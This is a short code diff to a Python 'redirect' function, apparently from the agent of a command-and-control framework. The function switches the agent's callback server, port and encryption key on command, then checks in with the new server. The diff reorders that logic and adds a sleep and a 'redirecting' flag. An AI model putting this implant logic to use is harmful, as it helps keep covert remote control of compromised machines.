@@ -1,10 +1,10 @@
 def redirect(task_id, command):
 
+    global redirecting
+    redirecting = True
+    time.sleep(int(agent.get_Sleep()))
     params = command.replace(":", " ")
-
     params = params.split(" ")
-
-    print(params)
 
     if len(params) < 2:
         response = {
@@ -16,21 +16,8 @@ def redirect(task_id, command):
         return
 
     else:
-
         ip = params[0]
         port = params[1]
-
-        if len(params) > 2:
-            print(colored("Setting key {}".format(params[2]), "red"))
-            agent.set_Encryption_key(params[2])
-
-        
-        agent.set_Server("http://" + ip)
-        agent.set_Port(port)
-
-        print(colored("Switching to {}:{}".format(agent.get_Server(), agent.get_Port())))
-
-        checkin()
 
         response = {
                 'task_id': task_id,
@@ -39,6 +26,15 @@ def redirect(task_id, command):
             }
         responses.append(response)
 
+        if len(params) > 2:
+            print(colored("Setting key {}".format(params[2]), "red"))
+            agent.set_Encryption_key(params[2])
+
+        agent.set_Server("http://" + ip)
+        agent.set_Port(port)
+        print(colored("Switching to {}:{}".format(agent.get_Server(), agent.get_Port()), "green"))
+        checkin()
         print("\t- Redirect Done")
+        redirecting = False
 
         return
